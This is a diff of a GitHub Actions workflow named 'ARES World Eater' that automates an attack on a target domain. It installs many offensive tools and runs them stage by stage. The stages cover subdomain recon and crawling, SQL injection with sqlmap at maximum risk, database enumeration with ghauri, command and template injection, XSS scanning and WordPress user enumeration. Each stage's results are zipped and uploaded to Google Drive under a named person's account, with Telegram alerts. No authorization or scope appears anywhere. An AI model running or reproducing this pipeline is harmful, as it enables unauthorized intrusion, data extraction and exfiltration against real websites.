@@ -1,4 +1,4 @@
-name: ARES World Eater - TOTAL ARSENAL FINAL
+name: ARES World Eater - UNRESTRICTED FINALITY
 on:
   workflow_dispatch:
 
@@ -13,15 +13,16 @@ jobs:
       - name: "Total Arsenal & Environment Injection"
         run: |
           sudo apt-get update
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto recon-ng dnsrecon
+          # Fixed Recon-ng installation path
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto
           mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
           echo "$HOME/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
           
-          # INSTALLERS
+          # INSTALLERS (Explicit Tool List)
           sudo gem install wpscan || true
           pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
-          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright || true
+          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng || true
           python3 -m playwright install chromium || true
 
           # GO Arsenal (The Heavy Hitters)
@@ -35,7 +36,7 @@ jobs:
           go install -v github.com/jaeles-project/jaeles@latest || true
           go install -v github.com/tomnomnom/assetfinder@latest || true
 
-          # Signatures
+          # Signatures & Wordlists
           jaeles config init && git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base || true
           wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt -O wordlists/dir-med.txt
 
@@ -51,7 +52,7 @@ jobs:
           TARGET=$(cat targets.txt | head -n 1)
           send_msg() { curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"; }
           
-          # Organized Uploader (Acts as Harsh, uses 15GB space)
+          # Organized Uploader (Acts as Harsh Vardhan Singh)
           cat << 'EOF' > oauth_upload.py
           import os, sys
           from google.oauth2.credentials import Credentials
@@ -75,40 +76,42 @@ jobs:
               upload(sys.argv[1], sys.argv[2], sys.argv[3])
           EOF
 
-          send_msg "☢️ *ARES WORLD EATER:* Engaged on \`$TARGET\`"
+          send_msg "☢️ *ARES WORLD EATER:* Total Arsenal engaged on \`$TARGET\`"
 
-          # 1. RECON (Subfinder + Nikto + Recon-ng)
+          # 1. STAGE: RECON (Subfinder + Assetfinder + Nikto + Recon-ng)
           subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt
           assetfinder --subs-only $TARGET >> output/recon/subfinder.txt
           nikto -h "https://$TARGET" -o output/recon/nikto.txt || true
+          recon-ng -m recon/domains-hosts/brute_hosts -c "options set SOURCE $TARGET; run; exit" > output/recon/recon-ng.txt || true
           sort -u output/recon/subfinder.txt > output/recon/all_subs.txt
           zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"
 
-          # 2. PROBING & VISUAL (Httpx + Gowitness)
+          # 2. STAGE: PROBING & VISUAL (Fixed httpx syntax)
           httpx -l output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
           [ ! -s output/probing/live.txt ] && echo "https://$TARGET" > output/probing/live.txt
           xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
           zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Visual"
 
-          # 3. CRAWLING (Katana + Waymore)
+          # 3. STAGE: CRAWLING (Katana + Waymore)
           katana -l output/probing/live.txt -d 10 -jc -o output/crawling/katana.txt || true
           waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
           grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
           zip -j crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"
 
-          # 4. EXPLOITATION (Dalfox + SQLMap + Nuclei + XSStrike)
-          # SQL INJECTION (Forced)
+          # 4. STAGE: AGGRESSIVE EXPLOITATION (Dalfox + SQLMap + Nuclei + XSStrike + Jaeles)
+          # SQL & Injection
           [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
-          [ -s output/crawling/params.txt ] && ghauri -m output/crawling/params.txt --batch > output/vulns/ghauri.txt || true
-          # XSS (Forced)
+          [ -s output/crawling/params.txt ] && ghauri -m output/crawling/params.txt --batch --dbs > output/vulns/ghauri.txt || true
+          commix --url="https://$TARGET" --batch > output/vulns/commix.txt || true
+          sstimap -u "https://$TARGET" --batch > output/vulns/sstimap.txt || true
+          # XSS & Web
           dalfox file output/crawling/katana.txt -o output/vulns/dalfox.txt || true
           xsstrike -u "https://$TARGET" --timeout 10 --skip > output/vulns/xsstrike.txt || true
-          # GENERAL
           nuclei -l output/probing/live.txt -severity critical,high,medium -json -o output/vulns/nuclei.json || true
           jaeles scan -u "https://$TARGET" -s $HOME/.jaeles/signatures-base/ -o output/vulns/jaeles/ || true
           zip -r vulns.zip output/vulns/* && python3 oauth_upload.py "vulns.zip" "$PARENT_FOLDER_ID" "Stage_4_Exploits"
 
-          # 5. SECRETS & SPECIALIZED (Trufflehog + WPScan + Corsy)
+          # 5. STAGE: SECRETS & SPECIALIZED (Trufflehog + WPScan + Corsy)
           trufflehog filesystem . > output/secrets/truffle.txt || true
           wpscan --url "https://$TARGET" --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
           python3 -m corsy.corsy -u "https://$TARGET" > output/specialized/corsy.txt || python3 -m corsy -u "https://$TARGET" > output/specialized/corsy.txt || true
